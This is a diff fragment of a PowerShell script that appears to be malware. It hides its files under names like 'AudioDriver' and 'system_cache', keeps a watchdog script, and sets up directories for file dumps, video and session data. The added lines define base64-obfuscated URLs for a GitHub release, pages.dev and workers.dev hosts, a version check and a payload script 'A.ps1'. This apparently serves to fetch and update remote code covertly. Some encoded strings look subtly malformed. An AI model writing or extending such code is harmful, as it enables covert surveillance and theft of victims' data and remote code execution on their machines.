@@ -8,6 +8,14 @@ $mainPath = "$env:APPDATA\Microsoft\Windows\system_cache"
 $scriptPath = "$env:APPDATA\AudioDriver\A.ps1"
 $watchdogPath = "$env:APPDATA\AudioDriver\watchdog.ps1"
 $sessionDataDir = "$env:USERPROFILE\sessionData"
+function Decode-Url($base64) {
+    return [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($base64))
+}
+$releasesUrl = Decode-Url "aAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBFAHgANgBUAGUAbgBaAHoALwBmAC8AcgBlAGwAZQBhAHMAZXMvAGQAbwB3AG4AbABvAGEAZAAvAHYAMQAuMAAvAA=="
+$pagesUrl    = Decode-Url "aAB0AHQAcABzADoALwAvADMALQA0AHAAeAAuAHAAYQBnAGUAcwAuAGQAZQB2AC8A"
+$serverUrl   = Decode-Url "aAB0AHQAcABzADoALwAvAHMAZQByAHYAZQByAC4AMQAxAG4ALgB3AG8AcgBrAGUAcgBzAC4AZABlAHYALwA="
+$versionURL  = Decode-Url "aAB0AHQAcABzADoALwAvADMALQA0AHAAeAAuAHAAYQBnAGUAcwAuAGQAZQB2AC92AGUAcgBzAGkAbwBuAC4AdAB4AHQ="
+$payloadURL  = Decode-Url "aAB0AHQAcABzADoALwAvADMALQA0AHAAeAAuAHAAYQBnAGUAcwAuAGQAZQB2AC8AQQAuAHAAcwAxAA=="
 New-Item -ItemType Directory -Force -Path $tempDir, $fileDumpDir, $videoSubDir | Out-Null
 $watchdogDir = Split-Path $watchdogPath
 if (!(Test-Path $watchdogDir)) {
